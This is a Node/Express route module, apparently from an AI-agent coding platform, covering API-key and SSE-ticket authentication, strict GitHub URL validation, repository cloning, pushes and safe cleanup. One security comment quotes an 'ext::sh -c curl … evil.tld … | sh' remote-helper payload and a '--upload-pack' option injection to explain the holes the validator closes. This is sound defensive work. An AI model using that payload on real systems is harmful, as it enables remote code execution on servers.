import { spawn } from 'child_process';
import path from 'path';
import os from 'os';
import { promises as fs } from 'fs';
import crypto from 'crypto';

import express from 'express';
import { Octokit } from '@octokit/rest';

import { SSEStreamWriter } from '../modules/account-wallet/index.js';
import {
  apiKeysDb,
  captureWorkspaceTopologyFence,
  githubTokensDb,
  isProjectMembershipEnforced,
  isWorkspaceTopologyFenceCurrent,
  projectsDb,
} from '../modules/database/index.js';
import {
  createAuthenticatedLaunchActor,
  isAuthenticatedLaunchActorCurrent,
} from '../modules/execution-permissions/actor.js';
import { queryClaudeSDK, abortClaudeSDKSession, isClaudeSDKSessionActive } from '../claude-sdk.js';
import { createRateLimiter } from '../middleware/rate-limit.js';
import { spawnCursor } from '../cursor-cli.js';
import { queryCodex } from '../openai-codex.js';
import { spawnOpenCode } from '../opencode-cli.js';
import { spawnKimiAgent } from '../kimi-agent-cli.js';
import { providerModelsService } from '../modules/providers/services/provider-models.service.js';
import { IS_PLATFORM } from '../constants/config.js';
import { requireExternalApiEnabled } from '../services/external-api-config.js';
import {
  bindConsumedAgentSsePrincipal,
  consumeAgentSseTicket,
  mintAgentSseTicket,
} from '../services/agent-sse-ticket.service.js';
import { normalizeProjectPath, validateWorkspacePath } from '../shared/utils.js';
import { runPermissionExecutionAdapter } from '../modules/execution-permissions/adapter.js';
import {
  appendBoundedDiagnostic,
  classifyGitCloneFailure,
  classifyGitPushFailure,
  createGitAskpassLease,
} from '../modules/projects/services/git-transport-security.service.js';
import {
  isProjectPathVisibleToUser,
  isSessionVisibleToUser,
} from '../modules/websocket/services/chat-websocket.service.js';

const router = express.Router();

class AgentAccessFenceError extends Error {
  constructor(code, notStarted) {
    super(code);
    this.code = code;
    this.notStarted = notStarted;
  }
}

const assertAgentAccessCurrent = (req, workspaceFence, notStarted) => {
  if (req.assertCurrentIdentity?.() !== true) {
    throw new AgentAccessFenceError('identity_changed', notStarted);
  }
  if (workspaceFence && !isWorkspaceTopologyFenceCurrent(workspaceFence)) {
    throw new AgentAccessFenceError('project_access_changed', notStarted);
  }
};

const sendAgentFenceError = (res, error) => res.status(409).set('Cache-Control', 'no-store').json({
  error: error.code === 'identity_changed' ? 'Identity changed during request' : 'Project access changed during request',
  code: error.code,
  notStarted: error.notStarted,
  ...(error.notStarted ? {} : { effectState: 'outcome_unknown' }),
});

/**
 * GL-8 (ADR-062): fleet flag reader gating the GLM OpenCode carrier. The single
 * source of truth is server/opencode-cli.js (which does not export it); this route
 * mirrors the same normalization so the REST agent path and the WS dispatch agree.
 * Default OFF — an unset/blank/non-truthy flag never enables the GLM agent surface.
 * @param {NodeJS.ProcessEnv} [env]
 * @returns {boolean}
 */
function isOpenCodeCarrierEnabled(env = process.env) {
  const raw = env?.NASSAJ_OPENCODE_CARRIER;
  if (typeof raw !== 'string') {
    return false;
  }
  const normalized = raw.trim().toLowerCase();
  return normalized === '1' || normalized === 'true' || normalized === 'yes' || normalized === 'on';
}

/**
 * Middleware to authenticate agent API requests.
 *
 * Supports two authentication modes:
 * 1. Platform mode (IS_PLATFORM=true): Rejected until ADR-134's verified-proxy
 *    or persisted service-principal identity contract is implemented.
 *
 * 2. API key mode (default): For self-hosted deployments where users authenticate
 *    via API keys created in the UI. Keys are validated against the local database.
 */
const rejectUnverifiedPlatformActor = (_req, res) => {
  // ADR-134: loopback placement and the legacy risk acknowledgement are not an
  // authenticated principal. Provider effects stay fail-closed until a signed
  // verified-proxy or persisted service-principal contract is adopted.
  return res.status(503).json({
    error: 'Platform provider launches require a verified actor.',
    code: 'PLATFORM_ACTOR_UNVERIFIED',
    notStarted: true,
  });
};

const toCanonicalApiKeyActor = (user) => ({
  ...user,
  authenticationKind: 'ck',
  authenticationCredentialId: `api-key:${user.api_key_id}`,
  authorizationGeneration: user.authorization_generation,
});

const attachCanonicalAgentPrincipal = (req, user) => {
  req.user = user?.authenticationKind === 'ck' ? user : toCanonicalApiKeyActor(user);
  const principal = createAuthenticatedLaunchActor(req.user);
  req.authenticatedPrincipal = principal;
  req.assertCurrentIdentity = () => isAuthenticatedLaunchActorCurrent(principal);
  return principal;
};

const validateExternalApiHeader = (req, res, next) => {
  if (IS_PLATFORM) return rejectUnverifiedPlatformActor(req, res);
  const apiKey = req.headers['x-api-key'];
  if (typeof apiKey !== 'string' || !apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }
  const user = apiKeysDb.validateApiKey(apiKey);
  if (!user) return res.status(401).json({ error: 'Invalid or inactive API key' });
  attachCanonicalAgentPrincipal(req, user);
  return next();
};

const validateExternalApiKey = (req, res, next) => {
  // ADR-102 (T-1242): reaching this middleware already means the owner has
  // enabled programmatic access — `requireExternalApiEnabled` runs BEFORE it in
  // the route below, deliberately, because the `IS_PLATFORM` branch immediately
  // under this comment authenticates without inspecting any credential.
  //
  // Permanent API keys are header-only. Query strings are routinely retained
  // by proxies, browser history and Referer, so even SSE must use a short-lived
  // one-shot ticket minted by the authenticated endpoint below.
  if (req.query.apiKey !== undefined) {
    return res.status(401).json({ error: 'API key query authentication is not supported' });
  }

  // Platform mode currently has no verifiable proxy principal. Reject before
  // issuing an SSE ticket or reaching any provider effect.
  if (IS_PLATFORM) {
    return rejectUnverifiedPlatformActor(req, res);
  }

  const rawTicket = req.query.sseTicket;
  if (rawTicket !== undefined) {
    const accept = String(req.headers.accept || '');
    if (!accept.includes('text/event-stream') || typeof rawTicket !== 'string') {
      return res.status(401).json({ error: 'Invalid SSE ticket' });
    }
    const headerKey = req.headers['x-api-key'];
    const headerUser = typeof headerKey === 'string' && headerKey
      ? apiKeysDb.validateApiKey(headerKey)
      : null;
    if (headerKey && !headerUser) {
      return res.status(401).json({ error: 'Invalid or inactive API key' });
    }
    const consumed = consumeAgentSseTicket(rawTicket, {
      path: `${req.baseUrl}${req.path}`,
      method: req.method,
      userId: headerUser?.id,
    });
    if (!consumed.ok) return res.status(401).json({ error: 'Invalid or expired SSE ticket' });
    const ticketUser = bindConsumedAgentSsePrincipal(
      consumed,
      headerUser ? toCanonicalApiKeyActor(headerUser) : null,
    );
    if (!ticketUser) return res.status(401).json({ error: 'Invalid or expired SSE ticket' });
    attachCanonicalAgentPrincipal(req, ticketUser);
    if (req.assertCurrentIdentity() !== true) {
      return res.status(401).json({ error: 'Invalid or inactive API key' });
    }
    return next();
  }
  return validateExternalApiHeader(req, res, next);
};

/**
 * Get the remote URL of a git repository
 * @param {string} repoPath - Path to the git repository
 * @returns {Promise<string>} - Remote URL of the repository
 */
async function getGitRemoteUrl(repoPath) {
  return new Promise((resolve, reject) => {
    const gitProcess = spawn('git', ['config', '--get', 'remote.origin.url'], {
      cwd: repoPath,
      stdio: ['pipe', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';

    gitProcess.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    gitProcess.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    gitProcess.on('close', (code) => {
      if (code === 0) {
        resolve(stdout.trim());
      } else {
        reject(new Error(`Failed to get git remote: ${stderr}`));
      }
    });

    gitProcess.on('error', (error) => {
      reject(new Error(`Failed to execute git: ${error.message}`));
    });
  });
}

/**
 * Normalize GitHub URLs for comparison
 * @param {string} url - GitHub URL
 * @returns {string} - Normalized URL
 */
function normalizeGitHubUrl(url) {
  // Remove .git suffix
  let normalized = url.replace(/\.git$/, '');
  // Convert SSH to HTTPS format for comparison
  normalized = normalized.replace(/^git@github\.com:/, 'https://github.com/');
  // Remove trailing slash
  normalized = normalized.replace(/\/$/, '');
  return normalized.toLowerCase();
}

// ---------------------------------------------------------------------------
// SEC-GIT-URL — strict GitHub URL validation (RCE via `git clone`)
// ---------------------------------------------------------------------------
//
// The previous gate was `githubUrl.includes('github.com')`. That is a SUBSTRING
// test, not a URL check, and git's transport layer treats the operand as a
// remote spec, not a URL. Two concrete bypasses this closes:
//
//   1. REMOTE-HELPER RCE — `ext::sh -c curl%20https://evil.tld/x.sh?github.com|sh`
//      contains "github.com", so it passed, and `git clone` then executes it via
//      the `ext::` remote helper => arbitrary code as the `nassaj` user. (Same
//      class: any `<transport>::<payload>` spec.)
//   2. ARGV OPTION INJECTION — a value starting with `-` (e.g.
//      `--upload-pack=<cmd>`) is consumed by `git clone` as an OPTION, not as
//      the repo operand.
//
// The gate below is an allowlist: the value must PARSE as a URL, be https, be
// exactly host `github.com`, carry no credentials/port/query/fragment, and have
// an `/<owner>/<repo>` path of safe characters. The URL handed to git is then
// REBUILT from the validated parts (never the raw input), and `--` precedes it
// in argv so nothing can be read as an option.

/** GitHub account names: alphanumeric + hyphen, ≤ 39 chars. */
const GITHUB_OWNER_PATTERN = /^[A-Za-z0-9][A-Za-z0-9-]{0,38}$/;
/** Repository names: alphanumeric plus . _ - ; must start alphanumeric. */
const GITHUB_REPO_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$/;

/**
 * Validates a client-supplied GitHub repository URL and returns its canonical
 * form. Throws on ANYTHING that is not a plain https github.com repo URL.
 *
 * @param {unknown} rawUrl candidate URL (untrusted request input)
 * @returns {{owner: string, repo: string, cloneUrl: string}} canonical parts
 * @throws {Error} generic 'Invalid GitHub URL' on every rejection
 */
export function parseSafeGitHubUrl(rawUrl) {
  const reject = () => {
    throw new Error('Invalid GitHub URL');
  };

  if (typeof rawUrl !== 'string') {
    reject();
  }
  const candidate = rawUrl.trim();
  // A leading '-' would be read by git as an option even before URL parsing.
  if (!candidate || candidate.startsWith('-')) {
    reject();
  }

  let parsed;
  try {
    parsed = new URL(candidate);
  } catch {
    reject();
  }

  // `ext::`, `git::`, `ssh://`, `file://`, `http://`, … all die here: only the
  // https scheme is accepted, and URL parsing already normalized the host.
  if (parsed.protocol !== 'https:') {
    reject();
  }
  // Exact host match — not endsWith (blocks `github.com.evil.tld`) and not
  // includes (blocks `evil.tld/?github.com`).
  if (parsed.hostname.toLowerCase() !== 'github.com') {
    reject();
  }
  if (parsed.port || parsed.username || parsed.password || parsed.search || parsed.hash) {
    reject();
  }

  const segments = parsed.pathname.split('/').filter(Boolean);
  if (segments.length !== 2) {
    reject();
  }

  const owner = decodeURIComponent(segments[0]);
  const repo = decodeURIComponent(segments[1]).replace(/\.git$/i, '');

  if (!GITHUB_OWNER_PATTERN.test(owner) || !GITHUB_REPO_PATTERN.test(repo)) {
    reject();
  }

  // Rebuilt from validated parts — the raw input never reaches git.
  return { owner, repo, cloneUrl: `https://github.com/${owner}/${repo}.git` };
}

/**
 * Same strictness for a remote URL READ BACK from a repository's git config
 * (`git config --get remote.origin.url`). That value is not direct request
 * input, but it IS attacker-influenced (a cloned repo, or a workspace path the
 * caller controls), and the old check there was also `.includes('github.com')`.
 * Accepts the two canonical github forms only.
 *
 * @param {unknown} rawUrl remote URL as stored in .git/config
 * @returns {{owner: string, repo: string, cloneUrl: string}}
 * @throws {Error} 'Invalid GitHub URL' when it is not a github.com remote
 */
export function parseSafeGitHubRemote(rawUrl) {
  if (typeof rawUrl !== 'string') {
    throw new Error('Invalid GitHub URL');
  }
  const candidate = rawUrl.trim();

  // scp-like SSH form: git@github.com:owner/repo(.git)
  const sshMatch = /^git@github\.com:([^/]+)\/(.+)$/i.exec(candidate);
  if (sshMatch) {
    const owner = sshMatch[1];
    const repo = sshMatch[2].replace(/\.git$/i, '');
    if (!GITHUB_OWNER_PATTERN.test(owner) || !GITHUB_REPO_PATTERN.test(repo)) {
      throw new Error('Invalid GitHub URL');
    }
    return { owner, repo, cloneUrl: `https://github.com/${owner}/${repo}.git` };
  }

  return parseSafeGitHubUrl(candidate);
}

/**
 * Parse GitHub URL to extract owner and repo.
 * Thin wrapper over the strict validator above so every caller shares ONE
 * policy (the old permissive regex accepted `ext::…github.com/a/b`). Exported
 * for the SEC-GIT-URL regression suite.
 * @param {string} url - GitHub URL (HTTPS or SSH)
 * @returns {{owner: string, repo: string}} - Parsed owner and repo
 */
export function parseGitHubUrl(url) {
  const { owner, repo } = parseSafeGitHubRemote(url);
  return { owner, repo };
}

/**
 * Auto-generate a branch name from a message
 * @param {string} message - The agent message
 * @returns {string} - Generated branch name
 */
function autogenerateBranchName(message) {
  // Convert to lowercase, replace spaces/special chars with hyphens
  let branchName = message
    .toLowerCase()
    .replace(/[^a-z0-9\s-]/g, '') // Remove special characters
    .replace(/\s+/g, '-') // Replace spaces with hyphens
    .replace(/-+/g, '-') // Replace multiple hyphens with single
    .replace(/^-|-$/g, ''); // Remove leading/trailing hyphens

  // Ensure non-empty fallback
  if (!branchName) {
    branchName = 'task';
  }

  // Generate timestamp suffix (last 6 chars of base36 timestamp)
  const timestamp = Date.now().toString(36).slice(-6);
  const suffix = `-${timestamp}`;

  // Limit length to ensure total length including suffix fits within 50 characters
  const maxBaseLength = 50 - suffix.length;
  if (branchName.length > maxBaseLength) {
    branchName = branchName.substring(0, maxBaseLength);
  }

  // Remove any trailing hyphen after truncation and ensure no leading hyphen
  branchName = branchName.replace(/-$/, '').replace(/^-+/, '');

  // If still empty or starts with hyphen after cleanup, use fallback
  if (!branchName || branchName.startsWith('-')) {
    branchName = 'task';
  }

  // Combine base name with timestamp suffix
  branchName = `${branchName}${suffix}`;

  // Final validation: ensure it matches safe pattern
  if (!/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(branchName)) {
    // Fallback to deterministic safe name
    return `branch-${timestamp}`;
  }

  return branchName;
}

/**
 * Validate a Git branch name
 * @param {string} branchName - Branch name to validate
 * @returns {{valid: boolean, error?: string}} - Validation result
 */
function validateBranchName(branchName) {
  if (!branchName || branchName.trim() === '') {
    return { valid: false, error: 'Branch name cannot be empty' };
  }

  // Git branch name rules
  const invalidPatterns = [
    { pattern: /^\./, message: 'Branch name cannot start with a dot' },
    { pattern: /\.$/, message: 'Branch name cannot end with a dot' },
    { pattern: /\.\./, message: 'Branch name cannot contain consecutive dots (..)' },
    { pattern: /\s/, message: 'Branch name cannot contain spaces' },
    { pattern: /[~^:?*\[\\]/, message: 'Branch name cannot contain special characters: ~ ^ : ? * [ \\' },
    { pattern: /@{/, message: 'Branch name cannot contain @{' },
    { pattern: /\/$/, message: 'Branch name cannot end with a slash' },
    { pattern: /^\//, message: 'Branch name cannot start with a slash' },
    { pattern: /\/\//, message: 'Branch name cannot contain consecutive slashes' },
    { pattern: /\.lock$/, message: 'Branch name cannot end with .lock' }
  ];

  for (const { pattern, message } of invalidPatterns) {
    if (pattern.test(branchName)) {
      return { valid: false, error: message };
    }
  }

  // Check for ASCII control characters
  if (/[\x00-\x1F\x7F]/.test(branchName)) {
    return { valid: false, error: 'Branch name cannot contain control characters' };
  }

  return { valid: true };
}

/**
 * Get recent commit messages from a repository
 * @param {string} projectPath - Path to the git repository
 * @param {number} limit - Number of commits to retrieve (default: 5)
 * @returns {Promise<string[]>} - Array of commit messages
 */
async function getCommitMessages(projectPath, limit = 5) {
  return new Promise((resolve, reject) => {
    const gitProcess = spawn('git', ['log', `-${limit}`, '--pretty=format:%s'], {
      cwd: projectPath,
      stdio: ['pipe', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';

    gitProcess.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    gitProcess.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    gitProcess.on('close', (code) => {
      if (code === 0) {
        const messages = stdout.trim().split('\n').filter(msg => msg.length > 0);
        resolve(messages);
      } else {
        reject(new Error(`Failed to get commit messages: ${stderr}`));
      }
    });

    gitProcess.on('error', (error) => {
      reject(new Error(`Failed to execute git: ${error.message}`));
    });
  });
}

/**
 * Create a new branch on GitHub using the API
 * @param {Octokit} octokit - Octokit instance
 * @param {string} owner - Repository owner
 * @param {string} repo - Repository name
 * @param {string} branchName - Name of the new branch
 * @param {string} baseBranch - Base branch to branch from (default: 'main')
 * @returns {Promise<void>}
 */
async function createGitHubBranch(octokit, owner, repo, branchName, baseBranch = 'main') {
  try {
    // Get the SHA of the base branch
    const { data: ref } = await octokit.git.getRef({
      owner,
      repo,
      ref: `heads/${baseBranch}`
    });

    const baseSha = ref.object.sha;

    // Create the new branch
    await octokit.git.createRef({
      owner,
      repo,
      ref: `refs/heads/${branchName}`,
      sha: baseSha
    });

    console.log(`✅ Created branch '${branchName}' on GitHub`);
  } catch (error) {
    if (error.status === 422 && error.message.includes('Reference already exists')) {
      console.log(`ℹ️ Branch '${branchName}' already exists on GitHub`);
    } else {
      throw error;
    }
  }
}

/**
 * Create a pull request on GitHub
 * @param {Octokit} octokit - Octokit instance
 * @param {string} owner - Repository owner
 * @param {string} repo - Repository name
 * @param {string} branchName - Head branch name
 * @param {string} title - PR title
 * @param {string} body - PR body/description
 * @param {string} baseBranch - Base branch (default: 'main')
 * @returns {Promise<{number: number, url: string}>} - PR number and URL
 */
async function createGitHubPR(octokit, owner, repo, branchName, title, body, baseBranch = 'main') {
  const { data: pr } = await octokit.pulls.create({
    owner,
    repo,
    title,
    head: branchName,
    base: baseBranch,
    body
  });

  console.log(`✅ Created pull request #${pr.number}: ${pr.html_url}`);

  return {
    number: pr.number,
    url: pr.html_url
  };
}

/**
 * Clone a GitHub repository to a directory
 * @param {string} githubUrl - GitHub repository URL
 * @param {string} githubToken - Optional GitHub token for private repos
 * @param {string} projectPath - Path for cloning the repository
 * @returns {Promise<string>} - Path to the cloned repository
 */
const serverCloneReceipts = new WeakSet();

async function retireServerCloneReceipt(receipt) {
  serverCloneReceipts.delete(receipt);
  await receipt?.directoryHandle?.close().catch(() => undefined);
}

function isPathWithinRoot(candidate, root) {
  const relative = path.relative(root, candidate);
  return relative === '' || (!relative.startsWith(`..${path.sep}`) && relative !== '..' && !path.isAbsolute(relative));
}

async function createServerCloneReceipt(cloneDir, canonicalParent) {
  const directoryHandle = await fs.open(cloneDir, 'r');
  try {
    const [cloneStat, pinnedStat, canonicalPath] = await Promise.all([
      fs.lstat(cloneDir), directoryHandle.stat(), fs.realpath(cloneDir),
    ]);
    if (!cloneStat.isDirectory() || cloneStat.isSymbolicLink()
        || cloneStat.dev !== pinnedStat.dev || cloneStat.ino !== pinnedStat.ino) {
      throw new Error('Repository clone did not create a regular directory');
    }
    if (!isPathWithinRoot(canonicalPath, canonicalParent)) {
      throw new Error('Repository clone escaped its target directory');
    }
    const receipt = Object.freeze({
      projectPath: cloneDir,
      canonicalPath,
      canonicalParent,
      device: cloneStat.dev,
      inode: cloneStat.ino,
      directoryHandle,
    });
    serverCloneReceipts.add(receipt);
    return receipt;
  } catch (error) {
    await directoryHandle.close();
    throw error;
  }
}

/**
 * Clones or reuses a repository and reports whether this process created it.
 * `dependencies.log` receives progress lines (default `console.log`) so callers
 * that do not own process stdout, such as node:test children, can capture them.
 */
export async function cloneGitHubRepoWithReceipt(
  githubUrl,
  githubToken = null,
  projectPath,
  dependencies = { spawnGit: spawn, createAskpass: createGitAskpassLease },
) {
  const log = dependencies.log ?? console.log;
  try {
      // SEC-GIT-URL: allowlist validation (see parseSafeGitHubUrl). Replaces the
      // `.includes('github.com')` substring test that let `ext::sh -c …` through.
      const { cloneUrl: canonicalUrl } = parseSafeGitHubUrl(githubUrl);

      const cloneDir = path.resolve(projectPath);

      // Reuse is never a creation receipt: cleanup may only remove a directory
      // whose absence and subsequent inode were observed by this process.
      let targetExists = false;
      try {
        await fs.lstat(cloneDir);
        targetExists = true;
      } catch (accessError) {
        if (accessError?.code !== 'ENOENT') throw accessError;
      }
      if (targetExists) {
        try {
          const existingUrl = await getGitRemoteUrl(cloneDir);
          const normalizedExisting = normalizeGitHubUrl(existingUrl);
          const normalizedRequested = normalizeGitHubUrl(canonicalUrl);

          if (normalizedExisting === normalizedRequested) {
            log('✅ Repository already exists at path with correct URL');
            return { projectPath: path.resolve(cloneDir), creationReceipt: null };
          } else {
            throw new Error(`Directory ${cloneDir} already exists with a different repository (${existingUrl}). Expected: ${githubUrl}`);
          }
        } catch (gitError) {
          throw new Error(`Directory ${cloneDir} already exists but is not a valid git repository or git command failed`);
        }
      }

      // Ensure parent directory exists
      await fs.mkdir(path.dirname(cloneDir), { recursive: true });
      const canonicalParent = await fs.realpath(path.dirname(cloneDir));

      log('🔄 Cloning repository:', canonicalUrl);
      log('📁 Destination:', cloneDir);

      const askpass = await dependencies.createAskpass(githubToken);
      return await new Promise((resolve, reject) => {
        const gitProcess = dependencies.spawnGit(
          'git',
          ['clone', '--depth', '1', '--', canonicalUrl, cloneDir],
          { stdio: ['ignore', 'pipe', 'pipe'], env: askpass.env },
        );
        let diagnostic = '';
        gitProcess.stdout.on('data', (data) => {
          diagnostic = appendBoundedDiagnostic(diagnostic, data);
        });
        gitProcess.stderr.on('data', (data) => {
          diagnostic = appendBoundedDiagnostic(diagnostic, data);
        });
        gitProcess.on('close', async (code) => {
          await askpass.cleanup();
          if (code === 0) {
            log('✅ Repository cloned successfully');
            try {
              const creationReceipt = await createServerCloneReceipt(cloneDir, canonicalParent);
              resolve({ projectPath: cloneDir, creationReceipt });
            } catch (receiptError) {
              reject(receiptError);
            }
            return;
          }
          const failure = classifyGitCloneFailure(diagnostic);
          const error = new Error(failure.message);
          error.code = failure.code;
          reject(error);
        });
        gitProcess.on('error', async () => {
          await askpass.cleanup();
          const error = new Error('Git could not be started');
          error.code = 'GIT_EXECUTION_FAILED';
          reject(error);
        });
      });
  } catch (error) {
    throw error;
  }
}

/** Backwards-compatible clone API for callers that do not own cleanup. */
export async function cloneGitHubRepo(githubUrl, githubToken = null, projectPath, dependencies) {
  const result = await cloneGitHubRepoWithReceipt(githubUrl, githubToken, projectPath, dependencies);
  if (result.creationReceipt) {
    await applyCloneRetentionPolicy(result.creationReceipt, { cleanup: false });
    dependencies?.onCloneReceiptRetired?.(result.creationReceipt);
  }
  return result.projectPath;
}

/** Executes one authenticated canonical GitHub push without credential argv. */
export async function pushGitHubBranch(
  { repoUrl, token, branchName, cwd },
  dependencies = { spawnGit: spawn, createAskpass: createGitAskpassLease },
) {
  const canonicalUrl = parseSafeGitHubUrl(repoUrl).cloneUrl;
  const askpass = await dependencies.createAskpass(token);
  try {
    return await new Promise((resolve, reject) => {
      const processHandle = dependencies.spawnGit(
        'git',
        ['push', canonicalUrl, `${branchName}:${branchName}`],
        { cwd, stdio: ['ignore', 'pipe', 'pipe'], env: askpass.env },
      );
      let diagnostic = '';
      processHandle.stdout.on('data', (data) => {
        diagnostic = appendBoundedDiagnostic(diagnostic, data);
      });
      processHandle.stderr.on('data', (data) => {
        diagnostic = appendBoundedDiagnostic(diagnostic, data);
      });
      processHandle.on('close', (code) => {
        if (code === 0 || diagnostic.includes('already exists') || diagnostic.includes('up-to-date')) {
          resolve({ reused: code !== 0 });
          return;
        }
        const failure = classifyGitPushFailure(diagnostic);
        const error = new Error(failure.message);
        error.code = failure.code;
        reject(error);
      });
      processHandle.on('error', () => {
        const error = new Error('Git could not be started');
        error.code = 'GIT_EXECUTION_FAILED';
        reject(error);
      });
    });
  } finally {
    await askpass.cleanup();
  }
}

/**
 * Moves the admitted clone into a private same-filesystem quarantine, then
 * rechecks its pinned inode before recursive removal. A same-UID process that
 * discovers and swaps the random quarantine path after that final check is
 * outside this path-based primitive's guarantee.
 */
export async function cleanupClonedProject(receipt, sessionId = null, dependencies = {}) {
  if (!receipt || !serverCloneReceipts.has(receipt)) {
    const error = new Error('Clone cleanup requires a server creation receipt');
    error.code = 'CLONE_CLEANUP_REFUSED';
    throw error;
  }
  const lstat = dependencies.lstat ?? fs.lstat;
  const realpath = dependencies.realpath ?? fs.realpath;
  const removeDirectory = dependencies.removeDirectory ?? fs.rm;
  const makeQuarantine = dependencies.makeQuarantine ?? fs.mkdtemp;
  const rename = dependencies.rename ?? fs.rename;
  const removeQuarantine = dependencies.removeQuarantine ?? fs.rmdir;
  let quarantineRoot = null;
  let quarantineTarget = null;
  let quarantineCommitted = false;
  try {
    let sessionPath = null;
    if (sessionId) {
      if (!/^[a-zA-Z0-9._-]{1,120}$/.test(sessionId)) {
        const error = new Error('Clone session cleanup identifier is invalid');
        error.code = 'CLONE_CLEANUP_REFUSED';
        throw error;
      }
      const sessionsRoot = path.resolve(os.homedir(), '.claude', 'sessions');
      sessionPath = path.resolve(sessionsRoot, sessionId);
      if (!isPathWithinRoot(sessionPath, sessionsRoot)) {
        const error = new Error('Clone session cleanup escaped its root');
        error.code = 'CLONE_CLEANUP_REFUSED';
        throw error;
      }
    }
    const [currentStat, pinnedStat] = await Promise.all([
      lstat(receipt.projectPath), receipt.directoryHandle.stat(),
    ]);
    const currentCanonicalPath = await realpath(receipt.projectPath);
    if (!currentStat.isDirectory() || currentStat.isSymbolicLink()
        || currentStat.dev !== receipt.device || currentStat.ino !== receipt.inode
        || pinnedStat.dev !== receipt.device || pinnedStat.ino !== receipt.inode
        || currentCanonicalPath !== receipt.canonicalPath
        || !isPathWithinRoot(currentCanonicalPath, receipt.canonicalParent)) {
      const error = new Error('Clone target changed before cleanup');
      error.code = 'CLONE_CLEANUP_REFUSED';
      throw error;
    }

    quarantineRoot = await makeQuarantine(path.join(receipt.canonicalParent, '.nassaj-clone-cleanup-'));
    const quarantineRootCanonical = await realpath(quarantineRoot);
    if (!isPathWithinRoot(quarantineRootCanonical, receipt.canonicalParent)) {
      const error = new Error('Clone cleanup quarantine escaped its parent');
      error.code = 'CLONE_CLEANUP_REFUSED';
      throw error;
    }
    quarantineTarget = path.join(quarantineRoot, 'clone');
    await dependencies.beforeQuarantine?.({
      originalPath: receipt.projectPath,
      quarantinePath: quarantineTarget,
    });
    await rename(receipt.projectPath, quarantineTarget);
    quarantineCommitted = true;
    const [quarantinedStat, quarantinedCanonical] = await Promise.all([
      lstat(quarantineTarget), realpath(quarantineTarget),
    ]);
    if (!quarantinedStat.isDirectory() || quarantinedStat.isSymbolicLink()
        || quarantinedStat.dev !== receipt.device || quarantinedStat.ino !== receipt.inode
        || !isPathWithinRoot(quarantinedCanonical, quarantineRootCanonical)) {
      const error = new Error('Clone target changed during cleanup admission');
      error.code = 'CLONE_CLEANUP_REFUSED';
      error.recoveryPath = quarantineTarget;
      throw error;
    }
    await dependencies.beforeRemove?.({
      originalPath: receipt.projectPath,
      quarantinePath: quarantineTarget,
    });
    await removeDirectory(quarantineTarget, { recursive: true, force: true });
    await retireServerCloneReceipt(receipt);
    await removeQuarantine(quarantineRoot).catch(() => undefined);
    if (sessionPath) {
      await removeDirectory(sessionPath, { recursive: true, force: true });
    }
  } catch (cause) {
    await retireServerCloneReceipt(receipt);
    let survivingRecoveryPath = null;
    if (quarantineCommitted) {
      try {
        await fs.lstat(quarantineTarget);
        survivingRecoveryPath = quarantineTarget;
      } catch {
        survivingRecoveryPath = null;
      }
    }
    if (cause && typeof cause === 'object') {
      if (survivingRecoveryPath) cause.recoveryPath = survivingRecoveryPath;
      else delete cause.recoveryPath;
    }
    if (quarantineRoot && !quarantineCommitted) {
      await removeQuarantine(quarantineRoot).catch(() => undefined);
    }
    if (cause?.code === 'CLONE_CLEANUP_REFUSED') {
      throw cause;
    }
    const error = new Error('Created repository cleanup failed');
    error.code = 'CLONE_CLEANUP_FAILED';
    error.cause = cause;
    if (cause?.recoveryPath) error.recoveryPath = cause.recoveryPath;
    throw error;
  }
}

/** Logs a bounded internal locator only when the retained quarantine still exists. */
export async function reportScheduledCloneCleanupFailure(error, log = console.error) {
  const rawCode = typeof error?.code === 'string' ? error.code : '';
  const code = /^[A-Z0-9_]{1,64}$/.test(rawCode) ? rawCode : 'CLONE_CLEANUP_FAILED';
  let cleanupLocator;
  const recoveryPath = typeof error?.recoveryPath === 'string' && error.recoveryPath.length <= 4096
    ? error.recoveryPath
    : null;
  if (recoveryPath && path.basename(recoveryPath) === 'clone') {
    const candidate = path.basename(path.dirname(recoveryPath));
    if (/^\.nassaj-clone-cleanup-[a-zA-Z0-9]{6}$/.test(candidate)) {
      try {
        const stat = await fs.lstat(recoveryPath);
        if (stat.isDirectory() && !stat.isSymbolicLink()) cleanupLocator = candidate;
      } catch {
        cleanupLocator = undefined;
      }
    }
  }
  log('[agent] scheduled clone cleanup failed', {
    code,
    ...(cleanupLocator ? { cleanupLocator } : {}),
  });
}

/** Applies the caller's retention choice only to a server-created clone. */
export async function applyCloneRetentionPolicy(
  receipt,
  { cleanup, sessionId = null },
  dependencies = {},
) {
  if (!receipt) return 'not_created';
  if (!cleanup) {
    await retireServerCloneReceipt(receipt);
    return 'retained';
  }
  await cleanupClonedProject(receipt, sessionId, dependencies);
  return 'removed';
}

/**
 * SSE Stream Writer - Adapts SDK/CLI output to Server-Sent Events
 */
/**
 * Non-streaming response collector
 */
class ResponseCollector {
  constructor(userId = null) {
    this.messages = [];
    this.sessionId = null;
    this.userId = userId;
  }

  send(data) {
    // Store ALL messages for now - we'll filter when returning
    this.messages.push(data);

    // Extract sessionId if present
    if (typeof data === 'string') {
      try {
        const parsed = JSON.parse(data);
        if (parsed.sessionId) {
          this.sessionId = parsed.sessionId;
        }
      } catch (e) {
        // Not JSON, ignore
      }
    } else if (data && data.sessionId) {
      this.sessionId = data.sessionId;
    }
  }

  end() {
    // Do nothing - we'll collect all messages
  }

  setSessionId(sessionId) {
    this.sessionId = sessionId;
  }

  getSessionId() {
    return this.sessionId;
  }

  getMessages() {
    return this.messages;
  }

  /**
   * Get filtered assistant messages only
   */
  getAssistantMessages() {
    const assistantMessages = [];

    for (const msg of this.messages) {
      // Skip initial status message
      if (msg && msg.type === 'status') {
        continue;
      }

      // Handle JSON strings
      if (typeof msg === 'string') {
        try {
          const parsed = JSON.parse(msg);
          // Only include claude-response messages with assistant type
          if (parsed.type === 'claude-response' && parsed.data && parsed.data.type === 'assistant') {
            assistantMessages.push(parsed.data);
          }
        } catch (e) {
          // Not JSON, skip
        }
      }
    }

    return assistantMessages;
  }

  /**
   * Calculate total tokens from all messages
   */
  getTotalTokens() {
    let totalInput = 0;
